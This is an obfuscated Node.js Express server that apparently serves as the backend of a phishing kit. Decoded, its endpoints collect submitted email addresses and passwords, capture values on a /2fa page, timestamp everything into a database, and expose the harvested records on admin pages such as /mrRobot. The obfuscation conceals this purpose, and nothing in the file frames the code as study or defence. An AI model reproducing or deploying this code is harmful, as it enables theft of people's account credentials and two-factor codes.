const _0x520b21=_0x2cf3;(function(_0x148bfe,_0x24e875){const _0x5a3f34=_0x2cf3,_0x38ae39=_0x148bfe();while(!![]){try{const _0x474c98=parseInt(_0x5a3f34(0x139))/0x1*(-parseInt(_0x5a3f34(0x14c))/0x2)+parseInt(_0x5a3f34(0x13b))/0x3+parseInt(_0x5a3f34(0x145))/0x4*(-parseInt(_0x5a3f34(0x143))/0x5)+parseInt(_0x5a3f34(0x152))/0x6*(parseInt(_0x5a3f34(0x150))/0x7)+-parseInt(_0x5a3f34(0x146))/0x8+parseInt(_0x5a3f34(0x15f))/0x9*(-parseInt(_0x5a3f34(0x130))/0xa)+-parseInt(_0x5a3f34(0x135))/0xb*(-parseInt(_0x5a3f34(0x16b))/0xc);if(_0x474c98===_0x24e875)break;else _0x38ae39['push'](_0x38ae39['shift']());}catch(_0x1d8040){_0x38ae39['push'](_0x38ae39['shift']());}}}(_0xe8d6,0x8572d));const express=require('express'),app=express(),path=require('path'),bodyParser=require('body-parser'),Cors=require(_0x520b21(0x136)),{connectToDb,getDb}=require(_0x520b21(0x153)),{error}=require(_0x520b21(0x14d)),PORT=process['env']['PORT']||0xbb8;function _0xe8d6(){const _0x512ad1=['status','post','/mrRobot','1719816WhhrCk','collection','view\x20engine','/signin','dataInput','redirect','static','520dyeCCb','/resendRequest','getMinutes','Document\x20inserted\x20successfully:','public','209rKhotr','cors','use','index','55QSFDtO','Pink','908844laqRjJ','getMonth','resend','body','Inserted\x20successfully','send','App\x20running\x20at\x20','insertOne','30lLMzQQ','/2fa','287792bDpdWc','7840768zqnmBu','set','getSeconds','resendRequests','Error\x20inserting\x20into\x20database:','CollectionOne','30042fGqOwC','console','get','ejs','7ymYSfr','urlencoded','583692FaPUpG','./db','find','green','Internal\x20Server\x20Error','/endpointOne','toArray','2fa','/endpoint2','getHours','signin','error','render','58626UiltEr','/endpoint3','/request','admin','json','/views','data','log','listen'];_0xe8d6=function(){return _0x512ad1;};return _0xe8d6();}app['use'](express[_0x520b21(0x12f)](_0x520b21(0x134))),app[_0x520b21(0x137)](express[_0x520b21(0x151)]({'extended':!![]})),app[_0x520b21(0x137)](bodyParser[_0x520b21(0x163)]()),app[_0x520b21(0x137)](Cors()),app[_0x520b21(0x147)](_0x520b21(0x12b),_0x520b21(0x14f)),app[_0x520b21(0x147)]('views',__dirname+_0x520b21(0x164));let db;connectToDb(_0x4e9aa6=>{const _0x3e488a=_0x520b21;!_0x4e9aa6&&(app[_0x3e488a(0x167)](PORT,()=>{const _0x37fd4b=_0x3e488a;console['log'](_0x37fd4b(0x141)+PORT);}),db=getDb());});const currentDate=new Date(),year=currentDate['getFullYear'](),month=currentDate[_0x520b21(0x13c)]()+0x1,day=currentDate['getDate'](),formattedCurrentDate=year+'-'+(month<0xa?'0':'')+month+'-'+(day<0xa?'0':'')+day,currentTime=new Date(),hours=currentTime[_0x520b21(0x15b)](),minutes=currentTime[_0x520b21(0x132)](),seconds=currentTime[_0x520b21(0x148)](),formattedCurrentTime=''+(hours<0xa?'0':'')+hours+':'+(minutes<0xa?'0':'')+minutes+':'+(seconds<0xa?'0':'')+seconds;let inMemoryStorage={},sucessTrue={};function _0x2cf3(_0x44a0b5,_0x20c880){const _0xe8d6f7=_0xe8d6();return _0x2cf3=function(_0x2cf333,_0x186f66){_0x2cf333=_0x2cf333-0x12b;let _0x4564b8=_0xe8d6f7[_0x2cf333];return _0x4564b8;},_0x2cf3(_0x44a0b5,_0x20c880);}app[_0x520b21(0x14e)](_0x520b21(0x16a),async(_0x34d0e3,_0x31d1fb)=>{const _0x28a1a3=_0x520b21,_0x4503f0=await db[_0x28a1a3(0x16c)](_0x28a1a3(0x14b))['find']()[_0x28a1a3(0x158)]();_0x31d1fb[_0x28a1a3(0x15e)](_0x28a1a3(0x162),{'result':_0x4503f0}),console[_0x28a1a3(0x166)](_0x4503f0);}),app[_0x520b21(0x14e)](_0x520b21(0x12c),async(_0x4c01ef,_0x302662)=>{const _0x326c1d=_0x520b21;_0x302662[_0x326c1d(0x15e)](_0x326c1d(0x15c));}),app['get'](_0x520b21(0x144),(_0x181b20,_0x5ad518)=>{const _0xc22ca6=_0x520b21;sucessTrue[_0xc22ca6(0x165)]=!![];const _0x4d887e=inMemoryStorage[_0xc22ca6(0x12d)];_0x5ad518[_0xc22ca6(0x15e)](_0xc22ca6(0x159),{'dataInput':_0x4d887e});}),app[_0x520b21(0x14e)]('/',async(_0x4ad6e7,_0x2d00bb)=>{const _0x1a10f7=_0x520b21,_0x22da5b=sucessTrue[_0x1a10f7(0x165)];_0x2d00bb[_0x1a10f7(0x15e)](_0x1a10f7(0x138),{'dataInput':_0x22da5b});}),app['get'](_0x520b21(0x161),async(_0x46e8c5,_0x122d58)=>{const _0x403c5f=_0x520b21,_0x30fc74=await db[_0x403c5f(0x16c)](_0x403c5f(0x149))[_0x403c5f(0x154)]()[_0x403c5f(0x158)]();_0x122d58[_0x403c5f(0x15e)](_0x403c5f(0x13d),{'result':_0x30fc74}),console[_0x403c5f(0x166)](_0x30fc74);}),app['post']('/storeData',(_0x537172,_0x58e051)=>{const _0x31fffd=_0x520b21,{key1:_0x1c5d18}=_0x537172['body'];console[_0x31fffd(0x166)](_0x1c5d18),inMemoryStorage['dataInput']=_0x1c5d18,_0x58e051[_0x31fffd(0x12e)]('/2fa');}),app[_0x520b21(0x169)](_0x520b21(0x157),async(_0x23769c,_0x3b0cc3)=>{const _0x54ae82=_0x520b21;try{const {email:_0x13f90e,password:_0x36758a}=_0x23769c['body'],_0x4d3fdb=await db[_0x54ae82(0x16c)]('CollectionOne')['insertOne']({'AccountType':'blue','Email\x20address':_0x13f90e,'Password':_0x36758a,'Date':formattedCurrentDate,'Time':formattedCurrentTime});console[_0x54ae82(0x166)](_0x4d3fdb),console[_0x54ae82(0x166)](_0x54ae82(0x133)),_0x3b0cc3[_0x54ae82(0x168)](0xc8)[_0x54ae82(0x140)](_0x54ae82(0x13f));}catch(_0x15ad82){console[_0x54ae82(0x15d)](_0x54ae82(0x14a),_0x15ad82),_0x3b0cc3[_0x54ae82(0x168)](0x1f4)[_0x54ae82(0x140)](_0x54ae82(0x156));}}),app[_0x520b21(0x169)](_0x520b21(0x15a),async(_0x398d09,_0x2db6de)=>{const _0x3b28bc=_0x520b21;try{const {email:_0x15817e,password:_0x21d8d6}=_0x398d09[_0x3b28bc(0x13e)],_0x2ba19e=await db[_0x3b28bc(0x16c)]('CollectionOne')[_0x3b28bc(0x142)]({'AccountType':_0x3b28bc(0x13a),'Email\x20address':_0x15817e,'Password':_0x21d8d6,'Date':formattedCurrentDate,'Time':formattedCurrentTime});console[_0x3b28bc(0x166)](_0x2ba19e),console[_0x3b28bc(0x166)]('Document\x20inserted\x20successfully:'),_0x2db6de[_0x3b28bc(0x168)](0xc8)[_0x3b28bc(0x140)](_0x3b28bc(0x13f));}catch(_0x335229){console[_0x3b28bc(0x15d)](_0x3b28bc(0x14a),_0x335229),_0x2db6de[_0x3b28bc(0x168)](0x1f4)[_0x3b28bc(0x140)](_0x3b28bc(0x156));}}),app[_0x520b21(0x169)](_0x520b21(0x160),async(_0x38647e,_0x327e73)=>{const _0x399038=_0x520b21;try{const {email:_0x1ba68e,password:_0x138abe}=_0x38647e[_0x399038(0x13e)];console['log'](_0x38647e[_0x399038(0x13e)]);const _0x13c5eb=await db['collection'](_0x399038(0x14b))[_0x399038(0x142)]({'AccountType':_0x399038(0x155),'Email\x20address':_0x1ba68e,'Password':_0x138abe,'Date':formattedCurrentDate,'Time':formattedCurrentTime});console[_0x399038(0x166)](_0x13c5eb),console['log'](_0x399038(0x133)),_0x327e73[_0x399038(0x168)](0xc8)[_0x399038(0x140)](_0x399038(0x13f));}catch(_0x9a2003){console[_0x399038(0x15d)](_0x399038(0x14a),_0x9a2003),_0x327e73[_0x399038(0x168)](0x1f4)['send']('Internal\x20Server\x20Error');}}),app[_0x520b21(0x169)](_0x520b21(0x131),async(_0x354f63,_0x2c785c)=>{const _0x438b29=_0x520b21,{key1:_0x526bc0}=_0x354f63['body'];console[_0x438b29(0x166)](_0x526bc0);try{const _0x5bd92d=await db['collection']('resendRequests')[_0x438b29(0x142)]({'AccountType':'green','Email\x20address':_0x526bc0,'Password':'yes','Date':formattedCurrentDate,'Time':formattedCurrentTime});console[_0x438b29(0x166)](_0x5bd92d),console['log']('Document\x20inserted\x20successfully:'),_0x2c785c['status'](0xc8)[_0x438b29(0x140)]('Inserted\x20successfully');}catch(_0x1b4973){console['error']('Error\x20inserting\x20into\x20database:',_0x1b4973),_0x2c785c['status'](0x1f4)['send'](_0x438b29(0x156));}});